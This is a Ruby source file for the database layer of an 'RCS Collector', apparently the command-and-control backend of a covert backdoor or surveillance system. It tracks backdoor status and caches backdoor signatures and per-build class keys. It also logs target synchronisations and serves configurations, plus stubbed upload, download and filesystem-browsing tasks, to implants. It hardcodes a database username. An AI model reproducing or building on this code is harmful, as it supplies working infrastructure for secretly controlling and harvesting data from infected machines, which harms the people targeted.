#
#  The DB abstraction layer
#

# relatives
require_relative 'config.rb'
require_relative 'db_xmlrpc.rb'
require_relative 'cache.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'digest/md5'
require 'singleton'
require 'pp'

module RCS
module Collector

class DB
  include Singleton
  include RCS::Tracer

  ACTIVE_BACKDOOR = 0
  DELETED_BACKDOOR = 1
  CLOSED_BACKDOOR = 2
  QUEUED_BACKDOOR = 3
  NO_SUCH_BACKDOOR = 4
  UNKNOWN_BACKDOOR = 5
  
  attr_reader :backdoor_signature

  def initialize
    # database address
    @host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s

    # database credentials
    @username = "9b7b0492433bd580805ba7685ae41b73RSS" #TODO: use an unique id
    @password = File.read(Dir.pwd + "/config/" + Config.instance.global['DB_SIGN'])

    # status of the db connection
    @available = false

    # global (per customer) backdoor signature
    @backdoor_signature = nil
    @class_keys = {}
    
    # the current db layer to be used is the XML-RPC protocol
    # this will be replaced by DB_rabbitmq
    @db = DB_xmlrpc.new @host

    return @available
  end

  def connect!
    trace :info, "Checking the DB connection [#{@host}]..."
    if @db.login @username, @password then
      @available = true
      trace :info, "Connected to [#{@host}]"
    else
      @available = false
      trace :error, "Cannot login to DB"
    end
    return @available
  end

  def disconnect!
    @db.logout
    @available = false
    trace :info, "Disconnected from [#{@host}]"
  end

  def connected?
    # is the database available ?
    #TODO: set this variable accordingly in each method to detect when the db is down
    return @available
  end

  def cache_init

    # if the db is available, clear the cache and populate it again
    if @available then
      trace :info, "Emptying the DB cache..."
      # empty the cache and populate it again
      Cache.empty!

      trace :info, "Populating the DB cache..."
      # get the global signature (per customer) for all the backdoors
      sig = @db.backdoor_signature
      @backdoor_signature = Digest::MD5.digest sig unless sig.nil? 
      
      # get the classkey of every backdoor and store it in the cache
      @class_keys = @db.class_keys

      # save in the permanent cache
      Cache.signature = sig
      trace :info, "Backdoor signature saved in the DB cache"
      Cache.add_class_keys @class_keys
      trace :info, "#{@class_keys.length} entries saved in the the DB cache"

      return true
    end

    # the db is not available
    # check if the cache already exists and has some entries
    if Cache.length > 0 then
      trace :info, "Loading the DB cache..."

      # populate the memory cache from the permanent one
      @backdoor_signature = Digest::MD5.digest Cache.signature unless Cache.signature.nil?
      @class_keys = Cache.class_keys

      trace :info, "#{@class_keys.length} entries loaded from DB cache"

      return true
    end

    # no db and no cache...
    return false
  end

  def update_status(status, message)
    trace :debug, "update status: #{message}"
    component = "RCS::Collector"
    remoteip = '' # used only by NC

    #TODO: implement these metrics (ARGH!!)
    disk = 0
    cpu = 0
    pcpu = 0

    @db.update_status component, remoteip, status, message, disk, cpu, pcpu 
  end

  def class_key_of(build_id)
    # if we already have it return otherwise we have to ask to the db
    return Digest::MD5.digest @class_keys[build_id] unless @class_keys[build_id].nil?

    trace :debug, "Cache Miss: class key for #{build_id}"
    
    # ask to the db the class key
    key = @db.class_keys build_id

    # save the class key in the cache (memory and permanent)
    if not key.nil? then
      @class_keys[build_id] = key

      # store it in the permanent cache
      entry = {}
      entry[build_id] = key
      Cache.add_class_keys entry

      # return the key
      return Digest::MD5.digest @class_keys[build_id]
    end

    # key not found
    return nil
  end

  # returns ALWAYS the status of a backdoor
  def status_of(build_id, instance_id, subtype)
    # if the database has gone, reply with a fake response in order for the sync to continue
    return DB::UNKNOWN_BACKDOOR, 0 if not @available

    trace :debug, "Asking the status of [#{build_id}] to the db"
    
    # ask the database the status of the backdoor
    return @db.status_of(build_id, instance_id, subtype)
  end

  def sync_for(bid, version, user, device, source, time)
    # database is down, continue
    return if not @available

    # tell the db that the backdoor has synchronized
    @db.sync_for bid, version, user, device, source, time
  end

  def new_conf?(bid)

    # check if we have the config in the cache
    # probably and old one not yet sent
    return true if Cache.new_conf? bid

    # retrieve the config from the db
    cid, config = @db.new_conf bid

    # put the config in the cache
    Cache.save_conf bid, cid, config unless config.nil?

    return (config.nil?) ? false : true
  end

  def new_conf(bid)
    # retrieve the config from the cache
    cid, config = Cache.new_conf bid

    return nil if config.nil?

    # set the status to "sent" in the db
    #@db.conf_sent cid

    # delete the conf from the cache
    Cache.del_conf bid

    return config
  end

  def new_uploads?(bid)
    #TODO: uploads retrieval
    #TODO: put the uploads in the cache
    return false
  end
  def new_uploads(bid)
    #TODO: retrieve the uploads from the cache
    return {:filename => "c:\\cicciopasticcio", :content => "bubbaloa"}, 0
  end

  def new_downloads?(bid)
    #TODO: downloads retrieval
    #TODO: put the downloads in the cache
    return false
  end
  def new_downloads(bid)
    #TODO: retrieve the downloads from the cache
    return ['c:\alor', 'c:\windows']
  end

  def new_filesystems?(bid)
    #TODO: filesystem retrieval
    #TODO: put the filesystem in the cache
    return false
  end
  def new_filesystems(bid)
    #TODO: retrieve the filesystem from the cache
    return [{:depth => 1, :path => 'c:\ciao'}, {:depth => 2, :path => 'd:\miao'}]
  end

end #DB

end #Collector::
end #RCS::